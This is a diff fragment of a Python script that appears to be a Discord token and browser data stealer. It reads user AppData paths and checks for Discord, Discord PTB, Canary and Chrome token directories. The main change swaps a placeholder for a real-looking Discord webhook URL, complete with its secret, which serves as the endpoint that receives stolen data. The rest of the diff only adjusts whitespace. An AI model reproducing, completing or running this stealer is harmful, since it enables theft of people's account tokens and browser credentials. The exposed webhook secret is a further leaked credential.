@@ -12,7 +12,7 @@ import zipfile
 from requests import get
 from dhooks import Webhook, File
 
-hook = Webhook('WEBHOOK HERE')
+hook = Webhook('https://discord.com/api/webhooks/737099445673656360/PsSk6H0AMXhhbVaC4zvWSGAqAqeEhhPuZlmEE7mmhRG1Ul3PBxrA-M3JOVWj0Jqrutob')
 path = os.getenv('APPDATA')
 localpath = os.getenv('LOCALAPPDATA')
 user = os.getenv('username')
@@ -43,7 +43,7 @@ if os.path.isdir(tokendir):
     failed = True
 else:
   discordinst = False
-  
+
 if os.path.isdir(ptbtokendir):
   ptbinst = True
   try:
@@ -54,7 +54,7 @@ if os.path.isdir(ptbtokendir):
      ptbfailed = True
 else:
   ptbinst = False
-  
+
 if os.path.isdir(canarytokendir):
   canaryinst = True
   try:
@@ -65,7 +65,7 @@ if os.path.isdir(canarytokendir):
      canaryfailed = True
 else:
   canaryinst = False
- 
+
 if os.path.isdir(chromedir):
   chromeinst = True
   try:
